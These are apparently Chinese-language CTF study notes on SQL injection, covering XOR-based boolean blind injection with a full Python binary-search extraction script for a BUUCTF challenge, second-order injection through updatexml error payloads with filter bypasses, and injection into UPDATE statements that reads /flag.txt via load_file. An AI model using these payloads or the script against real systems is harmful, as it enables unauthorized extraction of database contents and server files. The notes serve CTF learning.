## **sql注入考点**
有可能flag在表中，有可能sql注入出账户密码再登录后配置其他漏洞。

利用报错，布尔，二次注入获取同库不同表的记录。

高权限注入：常规查询，跨库查询，文件读写。
堆叠注入：不限制于查询语句，甚至提权命令执行。

## **布尔盲注**
部分sql盲注入如逻辑布尔盲注回显差异，需要使用代码一个一个字符跑出来。

异或盲注?id=1^1^1，
1^1同为0
1^0异为1
1^1^1值为1
1^0^1值为0
在这个前提下，分析回显内容的字符差异，进行布尔盲注，代码中使用二分法加快布尔盲注。
```
substr("abc",1,1)获取第一位置的1个字符
ord()字符转ascii的数值
ascii()字符转ascii的数值

先判断是否布尔差异，并判断过滤字符
1^length(database())>4
1^(length(database())=4)
1^length(database())<4


布尔，再异或的差异，获取表名
1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)^1
[*] F1naI1y,Flaaaaag~
猜测列名
1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))>0)^1
猜测列的值
1^(ord(substr((select(group_concat(列名))from(表名)),1,1))>0)^1

从中可以利用二分法加速
select ascii() %s %d   
python中%s运算符%d每次的中间值，比较的结果select
```
基本脚本模板
```
# [极客大挑战 2019]FinalSQL
# 异或布尔差异
# 先注出库名，在注入表名，表名中注出字段名，注出字段对应值。
# 使用select group_concat()带出字段所有的记录值为一个字符串。
# 使用布尔差异+二分法判断得出这个字符串内容。

import requests
import time

url = "http://f104602b-272b-426a-ae30-5c34b4510270.node5.buuoj.cn:81/search.php?"
temp = {"id": ""}
column = ""
for i in range(1, 1000):
    time.sleep(0.06)
    low = 32
    high = 128
    mid = (low + high) // 2
    while (low < high):
        # 库名
        # temp["id"] = "1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1" % (i, mid)
        # temp["id"] = "1^(ascii(substr(database(),%d,1))>%d)^1" % (i, mid)

        # 表名
        # temp["id"] = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" %(i,mid)
        # 字段名
        # temp["id"] = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1" %(i,mid)
        # 内容
        # temp["id"] = "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" %(i,mid)
        r = requests.get(url, params=temp)
        time.sleep(0.04)
        # print(low, high, mid, ":")
        if "Click" in r.text: #回显差异，存在Click字符则是对了
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 127):
        break
    column += chr(mid)
    print(column)

print("All:", column)
```






^
## **二次注入**

往往可以注册，先把payload注入数据库，
再在另一个页面，如查询详细资料，修改信息提交前等，会查询出来并二次直接查询数据库，造成二次注入。
一般是报错回显。
```
and or 被过滤，使用||，&&，^等
过滤空格使用括号
123"||(updatexml(1,concat('~',(select(database()))),1))#

123"||(updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli'))),1))#

123"||(updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag'))),1))#

123"||(updatexml(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),1))#

#正则f开头后就是一个
123"||(updatexml(1,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')),1))#

#updatexml()函数有长度限制（32位），使用reverse()进行倒序输出，将其与前段的flag进行拼接得到flag
123"||(updatexml(1,concat('~',reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#

123"||(updatexml(1,concat('~',((select(reverse(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#

#这里right()函数如果被过滤了，所以用reverse()
123"||(updatexml(1,concat('~',((select(right(real_flag_1s_here,30))from(users)where(real_flag_1s_here)regexp('^f')))),1))#
```

^
## **update的注入**
```
$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];

如果在代码中可知
update语句中，在update后面有注入，
即old_address=$row['address']
```
1、修改前面字段值
```
可以通过注入修改此时的前面字段的值，如address字段
',`address`=database()#

',`address`=(select(load_file("/flag.txt")))#
```
2、where报错注入
```
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
```